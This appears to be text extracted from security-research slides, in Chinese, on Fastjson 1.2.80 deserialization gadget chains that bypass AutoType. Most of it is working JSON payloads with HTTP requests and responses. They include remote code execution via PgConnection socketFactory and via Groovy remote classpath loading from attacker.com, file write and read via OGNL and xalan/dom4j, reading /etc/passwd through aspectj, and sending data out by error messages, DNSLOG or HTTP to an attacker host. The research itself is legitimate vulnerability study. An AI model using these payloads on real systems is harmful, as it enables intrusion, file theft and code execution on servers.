1.2.80版本
可修复此问
题。
JSON#toJavaObject(Type)
TypeUtils#cast(Object, Class, ParserConfig)
@type
"@type":"java.lang.String""@type" : "ognl.OgnlException"
"@type" : "ognl.OgnlException"
@type
ognl.OgnlException@a7e666
{"@type":"ognl.OgnlException"}
ThrowableDeserializer.createInstance() 反序列化 Exception
反序列化 setter method parameter OR public field (无视AutoType) 时添加类到白名单 
完成Exception对象反序列化
MiscCodec         JSONObject toJavaObject
caseToJavaBean
"@type":"java.lang.String""@type" : "ognl.OgnlException"
@type
caseToJavaBean
触
发点
gadget 条
件
Throwable子类
setter方法的参数
类型
public field参数
类型
构造
方法参数
类型
是否可作为gadget使用
√
×
结
束
向下再次
寻
找符合
条
件的类
JDBC connection
01
com.mysql.jdbc.JDBC4Connection
org.postgresql.jdbc.PgConnection
...
连接
数
据
库
new socketFactory(socketFactoryArg)
●
jdbc:postgresql://node1/test?
socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&
socketFactoryArg=http://target/exp.xml
execute command
parse
spring
config
{
"@type":"org.postgresql.jdbc.PgConnection",
"hostSpecs":[{"host":"127.0.0.1","port":2333}],
"user":"user",
"database":"test",
"info":{
    "socketFactory":"org.springframework.context.support.ClassPathXmlApplicationContext",
    "socketFactoryArg":"http://attacker.com/spring-context.xml"
},
"url":""
}
{
"@type":"java.lang.Exception",
"@type":"org.python.antlr.ParseException"
}
MiscCodec          JSONObject toJavaObject
com.ziclix.python.sql.PyConnection
org.postgresql.jdbc.PgConnection
org.python.antlr.ParseException#setType
②  
①
③
write file
02
OGNL 
{
    "@type":"java.lang.Exception",
    "@type":"ognl.OgnlException"
}
MiscCodec             JSONObject toJavaObject
ognl.Evaluation#Evaluation(ognl.SimpleNode, java.lang.Object, boolean)
ognl.ASTMethod#ASTMethod(ognl.OgnlParser, int)
ognl.OgnlParser#OgnlParser(java.io.InputStream, java.lang.String)
org.apache.commons.io.input.BOMInputStream
org.apache.commons.io.input.TeeInputStream
org.apache.commons.io.output.WriterOutputStream
org.apache.commons.io.input.CharSequenceInputStream
org.apache.commons.io.output.FileWriterWithEncoding
ognl.OgnlException#setEvaluation
①  
②  
write file content
or
read file content
OGNL 
{
"@type":"java.lang.Exception",
"@type":"org.apache.xml.dtm.DTMConfigur
ationException",
    ....
}
MiscCodec            JSONObject toJavaObject
org.apache.xpath.objects.XNodeSetForDOM#xctxt
org.apache.xpath.XPathContext#primaryReader
org.dom4j.io.XMLWriter#entityResolver
org.dom4j.io.SAXContentHandler#inputSource
org.xml.sax.InputSource#setByteStream(java.io.InputStream)
org.apache.xml.dtm.DTMConfigurationException#locator
①  
②  
org.xml.sax.InputSource#setCharacterStream(java.io.Reader)
xalan + dom4j
org.xml.sax.InputSource#setByteStream(java.io.InputStream)
org.apache.commons.io.input.BOMInputStream
org.apache.commons.io.input.TeeInputStream
org.apache.commons.io.output.WriterOutputStream
org.apache.commons.io.input.CharSequenceInputStream
org.apache.commons.io.output.FileWriterWithEncoding
write file content
or
read file content
xalan + dom4j
read file
03
public
read file content
aspectj
{"a":{
"@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCo
mpilationUnit",
"fileName":"/etc/passwd"
}}
JSONObject toString
{"$ref":"$.a.contents"}
{"fileName":"/etc/passwd","content
s":"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr
/sbin/nologin...","mainTypeName":"
passwd"}
root:x:0:0:root:/ro
ot:/bin/bash
daemon:x:1:1:dae
mon:/usr/sbin:/us
r/sbin/nologin...
{
    "@type": "java.lang.Exception",
    "@type": "org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"
}
MiscCodec           JSONObject toJavaObject
org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit
org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException
①  
②
③
"d":{"x":{"$ref":"$.c.contents"}}
}
127.0.0.1
localhost
255.255.255.255 broadcasthost
::1             
localhost
POST /login HTTP/1.1
Host:example.com
Content-Length: 154
{
 "username":{
     "@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCom
pilationUnit",
     "fileName":"/etc/passwd"
 },
 "password":"whatever"
}
HTTP/1.1 200 
Content-Type: application/json
Content-Length: 679
Connection: close
{
"msg":"用户名
{\"fileName\":\"/etc/passwd\",\"contents\":\"root:x:0:0:root:/root:/bin/b
ash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin...\",\"mainType
Name\":\"passwd\"}不
存
在
"
}
1
2
3
4
5
1
2
3
4
5
6
基于
字段输出在
页面的回
显
当
Web应
用中没
有有效的处理
异常
信息导致 Exception message 输出到了 response 时
就
可以利用这
一特点
，
通
过异常
信息带出想要回
显的数
据
。
例如
在
  Character 类反序
列化解析
的JSON对象不
满足条
件时
就
会被拼接
到 Exception message 中抛
出异常
。
基于
异常
报错的回
显
{{
        "@type":"java.lang.Character"{
            "c":{
                    "@type":"java.lang.String"
                    "hello world"
            }
}}
com.alibaba.fastjson.JSONException: can not cast to char, value : {"c":"hello world"}
        at com.alibaba.fastjson.util.TypeUtils.castToChar(TypeUtils.java:150)
"d":{"x":{"$ref":"$.c.contents"}}
}
127.0.0.1
localhost
255.255.255.255 broadcasthost
::1             
localhost
POST /login HTTP/1.1
Host:example.com
Content-Length: 226
{
        "@type":"java.lang.Character"{
            "c":{
           "@type":"org.aspectj.org.eclipse.jdt.internal.core.Basic
CompilationUnit",
           "fileName":"/etc/passwd"
            }
}
HTTP/1.1 200 
Content-Type: application/json
Content-Length: 14738
{
"error":"Bad Request",
"message":"JSON parse error: can not cast to char, value : 
{\"c\":{\"contents\":\"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:dae
mon:/usr/sbin:/usr/sbin/nologin...\",\"fileName\":\"/etc/passwd\",\"mai
nTypeName\":\"passwd\"}}",
"path":"/login"
}
1
2
3
4
5
1
2
3
4
5
基于
异常
报错的回
显
{ "a":{"@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit","fileName":"/tmp/test.txt"},
  "b":{"@type":"java.net.Inet4Address",
    "val":{"@type":"java.lang.String"
        {"@type":"java.util.Locale",
        "val":{"@type":"com.alibaba.fastjson.JSONObject",{
            "@type": "java.lang.String""@type":"java.util.Locale",
            "language":{"@type":"java.lang.String"{"$ref":"$"},
            "country":"x.l56y7u6g.dnslog.pw"
            }}
  }}
基于
DNSLOG回
显
使用 Locale 反序
列化的特性，
将两个字符串拼接
组
合
成 Locale 对象，
再通
过 
String 反序
列化将 Locale 对象 toString，
最
终
经由 Inet4Address 反序
列化时
DNSlog 带出数
据
new Locale("a","b").toString() = a_B
基于
HTTPLOG回
显
MiscCodec           JSONObject toJavaObject
ognl.Evaluation#Evaluation(ognl.SimpleNode, java.lang.Object, boolean)
ognl.ASTMethod#ASTMethod(ognl.OgnlParser, int)
ognl.OgnlParser#OgnlParser(java.io.InputStream, java.lang.String)
org.apache.commons.io.input.ReaderInputStream(java.io.Reader)
com.alibaba.fastjson.JSONReader
ognl.OgnlException#setEvaluation
{
    "@type":"java.lang.Exception",
    "@type":"ognl.OgnlException"
}
使用任意
一个可以把 InputStream 或者
 Reader 添加到白名单的前置
链
。
如
 OGNL ，
把 JSONReader 添加到白名单，
 再基于
 URLReader 发起
 HTTP 请
求
来
携带数
据
基于
HTTPLOG回
显
{"@type":"java.net.URL","val":{"@type":"java.lang.String"{"@type":"java.util.Local
e",
"val":{"@type":"com.alibaba.fastjson.JSONObject",{
"@type": "java.lang.String""@type":"java.util.Locale",
"language":"http://attacker.com/test?",
"country":{"@type":"java.lang.String"[
{"@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
"fileName":"/tmp/test.txt"}
]}}}
{
    "@type": "com.alibaba.fastjson.JSONReader",
        "reader": {
            "@type": "jdk.nashorn.api.scripting.URLReader",
            "url": ${variable}
        }
}
/tmp/test.txt
{{flag}}
execute code
04
{
"@type":"java.lang.Exception",  
"@type":"org.codehaus.groovy.cont
rol.CompilationFailedException",
"unit": {}
}
org.codehaus.groovy.control.ProcessingUnit
org.codehaus.groovy.control.CompilerConfiguration
org.codehaus.groovy.tools.javac.JavaStubCompilationUnit
①  
②  
class whitelist 
java.lang.Exception
java.lang.Class
org.codehaus.groovy.control.Pro
cessingUnit
org.codehaus.groovy.control.Co
mpilationFailedException
...
classpathList = [ http://attacker.com ]
otherField = null
classpathList
http://attacker.com
CompilerConfiguration
获取
到被赋予远程
classpath的GroovyClassLoader
从远程
加载
java class对象
实例化远程
java对象
org.codehaus.groovy.tools.javac.JavaStubCompilationUnit extends org.codehaus.groovy.control.ProcessingUnit
org.codehaus.groovy.control.CompilationUnit#addPhaseOperations
org.codehaus.groovy.transform.ASTTransformationVisitor#addPhaseOperations
org.codehaus.groovy.transform.ASTTransformationVisitor#addGlobalTransforms
/META-INF/services/org.codehaus.groovy.transform.ASTTransformation
Blue
Blue.class
@GroovyASTTransformation
public class Blue implements ASTTransformation
 {static{
        evil code
}
}
①  向目标发起
请
求
②  从attacker.com获取
要加载
的类名Blue
③  从 attacker.com 取
得Java类并实例化
attacker
server
attacker.com